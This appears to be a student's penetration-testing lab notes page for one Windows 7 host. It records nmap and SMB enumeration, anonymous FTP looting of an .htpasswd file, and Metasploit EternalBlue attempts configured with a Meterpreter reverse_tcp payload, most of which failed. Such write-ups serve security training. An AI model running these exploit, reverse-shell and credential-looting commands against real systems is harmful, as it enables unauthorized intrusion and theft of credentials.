**Navigation:** [Work index](../README.md) · [Attack plan](./attack_plan/README.md) · [Credential pivot (hub)](../credential_pivot_A_Rocha_hosts.md) · [Creds — this host](./credential_pivot.md) · [Dead ends](./unfruitful_attempts/README.md) · [A_Rocha README](../../README.md)

---

## `10.20.160.101` — Windows 7 Ultimate (validated recon)

| Field | Value |
|-------|--------|
| **NetBIOS name** | **CALLISTO** |
| **Workgroup** | **JUPITER** |
| **MAC** (from enum) | `00:50:56:86:4F:A2` |
| **OS** | **Windows 7 Ultimate 7601 SP1 x64** (from **CrackMapExec**) |
| **SMB signing** | **False** · **SMBv1: True** (CME) |
| **FTP anonymous** | **Allowed** — **`anonymous`** / **`test@`** (email-form password) → **`230 Logged on`** — FileZilla **0.9.37 beta** ([`101-011`](./Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png)). **`/forbidden`** on FTP lists **`.htaccess`**, **`.htpasswd`**, **`readme.auth_remote.txt`** — pull copies with **`lcd`**, **`get`** ([`101-013`](./Screenshots/101-013_ftp_forbidden_get_htaccess_tm6_afrocha.png)); **`cat`** looted **`.htpasswd`** locally ([`101-012`](./Screenshots/101-012_loot_cat_htpasswd_tm6_afrocha.png)). |
| **HTTP `/forbidden/`** | After **Basic Auth** with creds from **`.htpasswd`** ([`101-014`](./Screenshots/101-014_http_basic_auth_forbidden_prompt_tm6_afrocha.png)), browser hits **XAMPP “local network only”** **403**; error text names **`httpd-xampp.conf`** on the **server filesystem** ([`101-015`](./Screenshots/101-015_http_403_xampp_local_network_httpd_xampp_conf_tm6_afrocha.png)) — **not** a URL you can edit with **HTTP POST**; changing it needs **host access** (RDP/shell) or a **separate** misconfiguration (e.g. writable FTP/SMB into **`conf`**, unlikely here). |

**Open services (from `nmap --top-ports 1000`):** **21** (FileZilla **ftpd**), **80** (**Apache 2.2.17 Win32**, **PHP 5.3.4**, mod_ssl, mod_perl), **135/139/445** (MS-RPC / SMB), **443** (HTTPS), **3306** (MySQL?), **3389** (RDP), **49152–49155** (RPC). **HTTP** is an additional attack surface vs SMB-only assumptions.

**Null / anonymous SMB enum (this run):** **`smbclient -L -N`** reported anonymous login but **“SMB1 disabled — no workgroup available”** (no share list). **CrackMapExec** **`--shares -u '' -p ''`** → **`STATUS_ACCESS_DENIED`**. **`enum4linux -a`** retrieved **workgroup** and **nbtstat**, then **`NT_STATUS_ACCESS_DENIED`** on SID/OS/users/shares/groups/RID/printers — see **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)**. **Pivot:** **anonymous FTP** works (see table above); **MS17-010** dead end documented in [`unfruitful_attempts/README.md`](unfruitful_attempts/README.md); continue **HTTP** / **FTP listing & upload** (if permitted) per rubric.

### Plan of attack — commands (current)

```bash
export RHOST=10.20.160.101
echo TM6_afrocha; date

nmap -Pn -sV --top-ports 1000 "$RHOST" -oA ~/scans/nmap_101_top1000
nmap -Pn -sV -p 135,139,445,21,80,443,3306,3389,49152-49155 -sC "$RHOST" -oA ~/scans/nmap_101_services

smbclient -L "//${RHOST}" -N
crackmapexec smb "$RHOST" --shares -u '' -p ''
enum4linux -a "$RHOST"
```

**After you have a reason to test SMB vulns (lab allows):**

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
```

```text
# EternalBlue targets SMB — RPORT must be 445, RHOSTS must be 10.20.160.101 (not 10.20.150.x)
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.20.160.101
set RPORT 445
set LHOST <KALI_LAB_IP>
set LPORT 4444
check
run
```

If **`check`** reports **Host does NOT appear vulnerable** / **`STATUS_INVALID_HANDLE`** — the image is likely **MS17-010 patched** or the scanner cannot confirm exploitability. **`set ForceExploit true`** only **bypasses the abort**; if grooming finishes and there is still **no session**, treat **EternalBlue as dead** for this host — see [`101-008`](./Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png), [`101-009`](./Screenshots/101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png), [`101-010`](./Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png). **Pivot:** **HTTP** (**80** Apache/PHP), **FTP**, **RDP**, **MySQL**, or **credentialed** SMB — [`unfruitful_attempts/README.md`](unfruitful_attempts/README.md).

**`STATUS_TRUSTED_RELATIONSHIP_FAILURE` (`0xc000018d`) — not “untrusted user” vs `.100`:** That status is a **Windows domain / secure-channel** class error: the **workstation’s trust to its primary domain** (or SMB signing the **machine** account path) is broken or rejected — it is **not** Metasploit saying “use a user from **`10.20.160.100`** instead.” **ADRASTEA** (`.100`) being in workgroup **JUPITER** does **not** make its **local SAM** users magically **domain-logon** identities on **CALLISTO** (`.101`). **“Andrea”** (or any teammate sheet user) only helps if **`Andrea` is a valid account on `.101`** (or in the **same AD domain** **CALLISTO** joins) **and** you supply **`SMBUser` / `SMBPass` / `SMBDomain`** (or **`.`** / workgroup name) so **`IPC$`** accepts the session — and you may **still** see **`0xc000018d`** if the **host’s domain trust** itself is broken (lab image quirk), unrelated to which password you type. **Try credentialed SMB** with real **`.101`** creds from the sheet / cracked **`hashdump`** first; if the error persists, **stop betting on EternalBlue** and use **RDP / HTTP / FTP** lanes. See [`101-017`](./Screenshots/101-017_msf_eternalblue_status_trusted_relationship_failure_tm6_afrocha.png).

```text
# Example: only if ROE + you have a real .101 account (sheet / cracked reuse):
set SMBUser <user>
set SMBPass <password>
set SMBDomain .          # or WORKGROUP / actual short domain name from enum
check
```

**HTTP on 80/443 (parallel lane):**

```bash
curl -sik "http://$RHOST/"
# Nikto (port 80): scan from site root; follow up on XAMPP if curl shows Location → /xampp/
nikto -h "http://$RHOST"
nikto -h "http://${RHOST}/xampp/"
# HTTPS on 443 (if open): nikto -h "https://$RHOST" -ssl
```

**Nikto one-liners for `.101`:** `nikto -h http://10.20.160.101` and `nikto -h http://10.20.160.101/xampp/` (second pass hits the **302** landing path from **`curl -si`**). Add **`-maxtime 30m`** (or similar) if you need a bounded run.

**FTP — anonymous (validated):**

```bash
nmap -Pn -p21 -sV -sC "$RHOST"
ftp "$RHOST"
# Name: anonymous
# Password: test@   # any email-shaped string is typical for anonymous FTP
# → 230 Logged on — then e.g.:
#   lcd ~/loot/101
#   passive
#   binary
#   ls
#   cd forbidden    # .htaccess / .htpasswd / readme — get per lab ROE
#   get .htaccess
#   get .htpasswd
# Other dirs: ls, cd …, get/put only if the server allows writes (anonymous is often read-only).
```

**RDP when ready:**

```bash
nmap -Pn -p3389 -sV -sC "$RHOST"
# xfreerdp /v:$RHOST /u:<user> /p:<pass> /cert:ignore
```

Example output: **3389/tcp open** (`ssl/ms-wbt-server`), **`ssl-date`** / **clock-skew** — [`101-016`](./Screenshots/101-016_curl_302_xampp_nmap_3389_rdp_open_tm6_afrocha.png).

### Evidence (`101-NNN_*` — chronological for this host)

| # | File | What it shows |
|---|------|----------------|
| **101-001** | [`101-001_nmap_smbclient_cme_tm6_afrocha.png`](./Screenshots/101-001_nmap_smbclient_cme_tm6_afrocha.png) | `nmap --top-ports 1000`, **`smbclient -L -N`**, **CrackMapExec** null shares |
| **101-002** | [`101-002_enum4linux_workgroup_netbios_tm6_afrocha.png`](./Screenshots/101-002_enum4linux_workgroup_netbios_tm6_afrocha.png) | **enum4linux** — **JUPITER**, **CALLISTO**, nbtstat |
| **101-003** | [`101-003_enum4linux_access_denied_tm6_afrocha.png`](./Screenshots/101-003_enum4linux_access_denied_tm6_afrocha.png) | SID/OS/users/shares → **`ACCESS_DENIED`** |
| **101-004** | [`101-004_enum4linux_polenum_null_fail_tm6_afrocha.png`](./Screenshots/101-004_enum4linux_polenum_null_fail_tm6_afrocha.png) | Password policy / **NULL** session attach fail |
| **101-005** | [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](./Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png) | Groups / RID / printers → **denied** |
| **101-006** | [`101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png`](./Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png) | MSF EternalBlue — **wrong IP octet** + **`RPORT 80`** (use **`.160.101`** + **`445`**) — see [`unfruitful_attempts/README.md`](unfruitful_attempts/README.md) |
| **101-007** | [`101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png`](./Screenshots/101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png) | Same issue: **`RPORT 80`** → SMB **`IPC$`** error + **`not-vulnerable`** — **`set RPORT 445`** |
| **101-008** | [`101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png`](./Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png) | **`RPORT 445`** OK — **`check`** still **not vulnerable** / **`run`** aborts — treat host as **patched**; pivot off SMB exploit |
| **101-009** | [`101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png`](./Screenshots/101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png) | **`ForceExploit true`** — **`check`** still negative; target IDs as **Win7 Ultimate 7601 SP1**; exploit starts **groom / eb_trans2** — not a fix for “not vulnerable” |
| **101-010** | [`101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png`](./Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png) | **Pool grooming** + **Trans2 exploit packet** completes → **no Meterpreter session** — confirms **ForceExploit** did not achieve code exec (patched / hardened) |
| **101-011** | [`101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png`](./Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png) | **`ftp 10.20.160.101`** — **`anonymous`** / **`test@`** → **`230 Logged on`** — FileZilla **0.9.37 beta** (FTP access, not a shell) |
| **101-012** | [`101-012_loot_cat_htpasswd_tm6_afrocha.png`](./Screenshots/101-012_loot_cat_htpasswd_tm6_afrocha.png) | **`cat ~/loot/101/.htpasswd`** after **`get`** — confirms **Basic Auth** material for **`/forbidden/`** (keep real creds out of git if you re-screenshot with redaction) |
| **101-013** | [`101-013_ftp_forbidden_get_htaccess_tm6_afrocha.png`](./Screenshots/101-013_ftp_forbidden_get_htaccess_tm6_afrocha.png) | FTP **`cd forbidden`** — **`get .htaccess`** → **`226 Transfer OK`**; lists **`.htpasswd`**, **`readme.auth_remote.txt`** |
| **101-014** | [`101-014_http_basic_auth_forbidden_prompt_tm6_afrocha.png`](./Screenshots/101-014_http_basic_auth_forbidden_prompt_tm6_afrocha.png) | Browser **HTTP Basic** sign-in for **`10.20.160.101`** (realm **FORBIDDEN AREA** / path **`/forbidden/`**) |
| **101-015** | [`101-015_http_403_xampp_local_network_httpd_xampp_conf_tm6_afrocha.png`](./Screenshots/101-015_http_403_xampp_local_network_httpd_xampp_conf_tm6_afrocha.png) | **403** — XAMPP “**only from local network**”; names **`httpd-xampp.conf`** (server-side Apache config, not an HTTP upload target) |
| **101-016** | [`101-016_curl_302_xampp_nmap_3389_rdp_open_tm6_afrocha.png`](./Screenshots/101-016_curl_302_xampp_nmap_3389_rdp_open_tm6_afrocha.png) | **`curl -sik`** → **302** **`Location: …/xampp/`** (Apache **2.2.17** Win32, **PHP 5.3.x**); **`nmap -Pn -p3389 -sV -sC`** → **RDP** open + **`ssl-date`** / **clock-skew** |
| **101-017** | [`101-017_msf_eternalblue_status_trusted_relationship_failure_tm6_afrocha.png`](./Screenshots/101-017_msf_eternalblue_status_trusted_relationship_failure_tm6_afrocha.png) | **`ms17_010_eternalblue` `run`** — **`IPC$`** login error → **`RubySMB … 0xc000018d STATUS_TRUSTED_RELATIONSHIP_FAILURE`** — **no session** |

---
